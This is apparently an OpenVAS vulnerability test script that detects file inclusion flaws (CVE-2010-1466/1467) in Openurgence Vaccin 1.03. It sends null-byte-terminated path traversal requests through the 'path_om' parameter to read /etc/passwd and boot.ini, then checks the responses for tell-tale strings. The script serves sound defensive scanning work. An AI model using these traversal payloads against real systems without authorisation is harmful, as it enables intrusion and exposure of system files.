##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_open_urgence_vaccin_mult_lfi_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# Openurgence Vaccin Multiple File Inclusion Vulnerabilities 
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to obtain sensitive information
  or compromise the application and the underlying system.
  Impact Level: Application.";
tag_affected = "Openurgence Vaccin version 1.03";

tag_insight = "Input passed to the parameter 'path_om' in various files and to the
  parameter 'dsn[phptype]' in 'scr/soustab.php' are not properly verified
  before being used to include files.";
tag_solution = "No solution or patch is available as of 04th May, 2010. Information
  regarding this issue will be updated once the solution details are available.
  For more details refer, https://adullact.net/projects/openurgence/";
tag_summary = "This host is running Openurgence Vaccin and is prone multiple file
  inclusion vulnerabilities.";

if(description)
{
  script_id(800764);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-05-05 15:59:12 +0200 (Wed, 05 May 2010)");
  script_cve_id("CVE-2010-1466", "CVE-2010-1467");
  script_bugtraq_id(39412);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("Openurgence Vaccin Multiple File Inclusion Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "
  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/39400");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/57815");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/12193");

  script_description(desc);
  script_summary("Check the version and exploit for Openurgence Vaccin");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (c) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_open_urgence_vaccin_detect.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");

openPort = get_http_port(default:80);
if(!get_port_state(openPort)){
  exit(0);
}

## Get Openurgence Vaccin version from KB
openVer = get_kb_item("www/" + openPort + "/openUrgence_Vaccin");
if(!openVer){
  exit(0);
}

openVer = eregmatch(pattern:"^(.+) under (/.*)$", string:openVer);
if(openVer[1] != NULL)
{
  ## Check exploit on Linux
  sndReq = http_get(item:string(openVer[2], "/gen/obj/injection.class.php?path_om" +
                    "=../../../../../../../../../../../../../etc/passwd%00"),
                     port:openPort);
  rcvRes = http_send_recv(port:openPort, data:sndReq);
  
  ## Check attack response for Linux
  if("root" >< rcvRes || "daemon:/sbin" >< rcvRes)
  {
    security_hole(openPort);
    exit(0);
  }

  ## Check exploit on Windows
  sndReq = http_get(item:string(openVer[2], "/gen/obj/injection.class.php?path_om" +
                    "=../../../../../../../../../../../../../boot.ini%00"),
                    port:openPort);
  rcvRes = http_send_recv(port:openPort, data:sndReq);
  ## Check attack response for Windows
  if("\WINDOWS" >< rcvRes || "partition" >< rcvRes)
  {
    security_hole(openPort);
    exit(0);
  }
}
